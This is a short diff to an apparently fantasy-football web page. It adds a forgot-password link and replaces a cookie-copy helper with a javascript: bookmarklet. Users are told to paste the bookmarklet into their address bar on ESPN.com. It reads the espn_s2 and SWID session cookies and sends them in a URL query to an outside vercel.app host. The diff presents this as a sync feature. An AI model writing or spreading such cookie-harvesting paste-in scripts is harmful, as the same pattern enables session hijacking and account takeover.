@@ -164,6 +164,12 @@
                         <input type="password" id="loginPassword" class="form-control bg-dark text-white border-secondary" placeholder="••••••••">
                     </div>
                     <button class="btn btn-primary w-100 fw-bold py-2" id="doLogin">Sign In</button>
+
+                    <div class="text-center">
+                    <a href="javascript:void(0)" onclick="handleForgotPassword()" class="small text-secondary text-decoration-none hover-primary">
+                        Forgot your password?
+                    </a>
+                </div>
                 </div>
             </div>
         </div>
@@ -176,9 +182,11 @@
 
     <script>
         function copyMobileScript() {
-            const script = 'javascript:prompt("Copy this string and send to your Commissioner", document.cookie);';
+    // This version automatically sends them back to your site with the data
+            const script = 'javascript:(function(){const s2=document.cookie.match(/espn_s2=([^;]+)/);const swid=document.cookie.match(/SWID=([^;]+)/);if(s2&&swid){window.location.href=`https://espnfantasywebsite-rhua68s-projects.vercel.app/views/sync.html?s2=${s2[1]}&swid=${swid[1]}`;}else{alert("Please log in to ESPN first!");}})();';
+            
             navigator.clipboard.writeText(script);
-            alert("Mobile script copied! \n1. Go to ESPN.com on your phone. \n2. Type 'javascript:' in address bar and paste this code.");
+            alert("Mobile script copied! \n\n1. Go to ESPN.com on your phone. \n2. Paste this in the address bar. \n3. MANUALLY TYPE 'javascript:' at the very beginning before hitting Go.");
         }
     </script>
 
